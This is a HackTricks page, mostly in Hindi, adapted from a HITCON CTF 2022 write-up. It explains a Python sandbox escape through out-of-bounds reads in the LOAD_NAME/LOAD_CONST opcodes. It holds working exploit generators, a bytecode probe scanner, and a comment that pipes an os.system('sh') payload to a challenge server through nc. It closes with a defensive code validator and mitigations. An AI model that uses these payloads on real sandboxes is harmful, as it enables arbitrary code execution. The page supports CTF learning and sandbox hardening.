# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**यह जानकारी** [**इस लेख से ली गई है**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

हम LOAD_NAME / LOAD_CONST opcode में OOB read फीचर का उपयोग करके मेमोरी में कुछ प्रतीक प्राप्त कर सकते हैं। जिसका मतलब है `(a, b, c, ... सैकड़ों प्रतीक ..., __getattribute__) if [] else [].__getattribute__(...)` जैसे ट्रिक का उपयोग करके आप जिस प्रतीक (जैसे फ़ंक्शन का नाम) को चाहते हैं, उसे प्राप्त करना।

फिर बस अपने एक्सप्लॉइट को तैयार करें।

### Overview <a href="#overview-1" id="overview-1"></a>

स्रोत कोड काफी छोटा है, इसमें केवल 4 पंक्तियाँ हैं!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
आप मनमाने Python कोड को इनपुट कर सकते हैं, और इसे [Python कोड ऑब्जेक्ट](https://docs.python.org/3/c-api/code.html) में संकलित किया जाएगा। हालाँकि उस कोड ऑब्जेक्ट के `co_consts` और `co_names` को eval करने से पहले एक खाली ट्यूपल के साथ बदल दिया जाएगा।

इस प्रकार, सभी अभिव्यक्तियाँ जिनमें consts (जैसे संख्याएँ, स्ट्रिंग्स आदि) या नाम (जैसे वेरिएबल्स, फ़ंक्शंस) शामिल हैं, अंत में सेगमेंटेशन फॉल्ट का कारण बन सकती हैं।

### आउट ऑफ बाउंड रीड <a href="#out-of-bound-read" id="out-of-bound-read"></a>

सेगफॉल्ट कैसे होता है?

आइए एक सरल उदाहरण से शुरू करते हैं, `[a, b, c]` निम्नलिखित बाइटकोड में संकलित हो सकता है।
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
लेकिन अगर `co_names` खाली ट्यूपल हो जाए? `LOAD_NAME 2` ऑपकोड अभी भी निष्पादित होता है, और उस मेमोरी पते से मान पढ़ने की कोशिश करता है जहाँ इसे मूल रूप से होना चाहिए था। हाँ, यह एक आउट-ऑफ-बाउंड पढ़ने की "विशेषता" है।

समाधान का मूल सिद्धांत सरल है। CPython में कुछ ऑपकोड जैसे `LOAD_NAME` और `LOAD_CONST` OOB पढ़ने के प्रति संवेदनशील (?) हैं।

वे `consts` या `names` ट्यूपल से `oparg` के इंडेक्स से एक ऑब्जेक्ट प्राप्त करते हैं (यही `co_consts` और `co_names` के तहत नामित होते हैं)। हम `LOAD_CONST` के बारे में निम्नलिखित छोटे स्निप्पेट का संदर्भ ले सकते हैं ताकि देख सकें कि CPython `LOAD_CONST` ऑपकोड को प्रोसेस करते समय क्या करता है।
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
इस तरह हम OOB फीचर का उपयोग करके मनमाने मेमोरी ऑफसेट से "नाम" प्राप्त कर सकते हैं। यह सुनिश्चित करने के लिए कि इसके पास कौन सा नाम है और इसका ऑफसेट क्या है, बस `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... को आजमाते रहें। और आप लगभग oparg > 700 में कुछ पा सकते हैं। आप निश्चित रूप से gdb का उपयोग करके मेमोरी लेआउट को देखने की कोशिश कर सकते हैं, लेकिन मुझे नहीं लगता कि यह अधिक आसान होगा?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

एक बार जब हम नामों / कॉन्स्ट के लिए उन उपयोगी ऑफसेट को प्राप्त कर लेते हैं, तो हम उस ऑफसेट से नाम / कॉन्स्ट कैसे प्राप्त करते हैं और इसका उपयोग करते हैं? आपके लिए एक ट्रिक है:\
मान लीजिए कि हम ऑफसेट 5 (`LOAD_NAME 5`) से `__getattribute__` नाम प्राप्त कर सकते हैं जिसमें `co_names=()` है, तो बस निम्नलिखित कार्य करें:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> ध्यान दें कि इसे `__getattribute__` के रूप में नामित करना आवश्यक नहीं है, आप इसे कुछ छोटा या अजीब नाम दे सकते हैं

आप इसके बाइटकोड को देखकर इसके पीछे का कारण समझ सकते हैं:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
ध्यान दें कि `LOAD_ATTR` भी `co_names` से नाम प्राप्त करता है। यदि नाम समान है, तो Python उसी ऑफसेट से नाम लोड करता है, इसलिए दूसरा `__getattribute__` अभी भी offset=5 से लोड होता है। इस विशेषता का उपयोग करके, हम मनमाना नाम उपयोग कर सकते हैं जब नाम पास की मेमोरी में हो।

संख्याएँ उत्पन्न करना तुच्छ होना चाहिए:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

मैंने लंबाई सीमा के कारण consts का उपयोग नहीं किया।

पहले, यहाँ एक स्क्रिप्ट है जो हमें उन नामों के ऑफसेट खोजने में मदद करेगी।
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
और निम्नलिखित वास्तविक Python एक्सप्लॉइट उत्पन्न करने के लिए है।
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
यह मूल रूप से निम्नलिखित चीजें करता है, उन स्ट्रिंग्स के लिए जिन्हें हम `__dir__` विधि से प्राप्त करते हैं:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### संस्करण नोट्स और प्रभावित ऑपकोड (Python 3.11–3.13)

- CPython बाइटकोड ऑपकोड अभी भी `co_consts` और `co_names` ट्यूपल्स में पूर्णांक ऑपरेशंस द्वारा इंडेक्स करते हैं। यदि एक हमलावर इन ट्यूपल्स को खाली (या बाइटकोड द्वारा उपयोग किए गए अधिकतम इंडेक्स से छोटा) करने के लिए मजबूर कर सकता है, तो इंटरप्रेटर उस इंडेक्स के लिए आउट-ऑफ-बाउंड मेमोरी पढ़ेगा, जिससे निकटवर्ती मेमोरी से एक मनमाना PyObject पॉइंटर प्राप्त होगा। प्रासंगिक ऑपकोड में कम से कम शामिल हैं:
- `LOAD_CONST consti` → पढ़ता है `co_consts[consti]`।
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → नाम पढ़ते हैं `co_names[...]` से (3.11+ के लिए ध्यान दें `LOAD_ATTR`/`LOAD_GLOBAL` स्टोर फ्लैग बिट्स निम्न बिट में हैं; वास्तविक इंडेक्स है `namei >> 1`)। प्रत्येक संस्करण के लिए सटीक अर्थ के लिए डिसअसेंबलर दस्तावेज़ देखें। [Python dis docs]।
- Python 3.11+ ने अनुकूली/इनलाइन कैश पेश किए हैं जो निर्देशों के बीच छिपे हुए `CACHE` प्रविष्टियाँ जोड़ते हैं। यह OOB प्राइमिटिव को नहीं बदलता; इसका मतलब केवल यह है कि यदि आप बाइटकोड को हाथ से बनाते हैं, तो आपको `co_code` बनाते समय उन कैश प्रविष्टियों का ध्यान रखना होगा।

व्यावहारिक प्रभाव: इस पृष्ठ में तकनीक CPython 3.11, 3.12 और 3.13 पर काम करना जारी रखती है जब आप एक कोड ऑब्जेक्ट को नियंत्रित कर सकते हैं (जैसे, `CodeType.replace(...)` के माध्यम से) और `co_consts`/`co_names` को छोटा कर सकते हैं।

### उपयोगी OOB इंडेक्स के लिए त्वरित स्कैनर (3.11+/3.12+ संगत)

यदि आप उच्च-स्तरीय स्रोत से नहीं बल्कि सीधे बाइटकोड से दिलचस्प ऑब्जेक्ट्स के लिए जांचना पसंद करते हैं, तो आप न्यूनतम कोड ऑब्जेक्ट्स उत्पन्न कर सकते हैं और इंडेक्स को ब्रूट फोर्स कर सकते हैं। नीचे दिया गया सहायक आवश्यकतानुसार इनलाइन कैश स्वचालित रूप से सम्मिलित करता है।
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- नामों की जांच करने के लिए, `LOAD_CONST` को `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` के साथ बदलें और अपनी स्टैक उपयोगिता को तदनुसार समायोजित करें।
- यदि आवश्यक हो, तो 255 से अधिक इंडेक्स तक पहुँचने के लिए `EXTENDED_ARG` या `arg` के कई बाइट्स का उपयोग करें। ऊपर की तरह `dis` के साथ निर्माण करते समय, आप केवल निम्न बाइट को नियंत्रित करते हैं; बड़े इंडेक्स के लिए, कच्चे बाइट्स को स्वयं बनाएं या हमले को कई लोड में विभाजित करें।

### न्यूनतम बाइटकोड-केवल RCE पैटर्न (co_consts OOB → builtins → eval/input)

एक बार जब आप एक `co_consts` इंडेक्स की पहचान कर लेते हैं जो builtins मॉड्यूल को हल करता है, तो आप स्टैक को हेरफेर करके `eval(input())` को बिना किसी `co_names` के पुनर्निर्माण कर सकते हैं:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
यह दृष्टिकोण उन चुनौतियों में उपयोगी है जो आपको `co_code` पर प्रत्यक्ष नियंत्रण देती हैं जबकि `co_consts=()` और `co_names=()` को मजबूर करती हैं (जैसे, BCTF 2024 “awpcode”)। यह स्रोत-स्तरीय चालाकियों से बचता है और बाइटकोड स्टैक ऑप्स और ट्यूपल बिल्डर्स का उपयोग करके पेलोड का आकार छोटा रखता है।

### सैंडबॉक्स के लिए रक्षात्मक जांच और शमन

यदि आप एक Python “sandbox” लिख रहे हैं जो अविश्वसनीय कोड को संकलित/मूल्यांकन करता है या कोड ऑब्जेक्ट्स को संशोधित करता है, तो बाइटकोड द्वारा उपयोग किए जाने वाले ट्यूपल इंडेक्स की सीमा-जांच के लिए CPython पर निर्भर न रहें। इसके बजाय, उन्हें निष्पादित करने से पहले स्वयं कोड ऑब्जेक्ट्स को मान्य करें।

व्यावहारिक मान्यकर्ता (co_consts/co_names के लिए OOB पहुंच को अस्वीकार करता है)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
अतिरिक्त शमन विचार
- अविश्वसनीय इनपुट पर मनमाना `CodeType.replace(...)` की अनुमति न दें, या परिणामी कोड ऑब्जेक्ट पर सख्त संरचनात्मक जांच जोड़ें।
- CPython अर्थशास्त्र पर निर्भर रहने के बजाय, अविश्वसनीय कोड को OS-स्तरीय सैंडबॉक्सिंग (seccomp, job objects, containers) के साथ एक अलग प्रक्रिया में चलाने पर विचार करें।

## संदर्भ

- Splitline का HITCON CTF 2022 लेख “V O I D” (इस तकनीक का मूल और उच्च-स्तरीय शोषण श्रृंखला): https://blog.splitline.tw/hitcon-ctf-2022/
- Python डिसassembler दस्तावेज़ (LOAD_CONST/LOAD_NAME/etc. के लिए अनुक्रमांक अर्थशास्त्र, और 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` निम्न-बिट फ्लैग): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
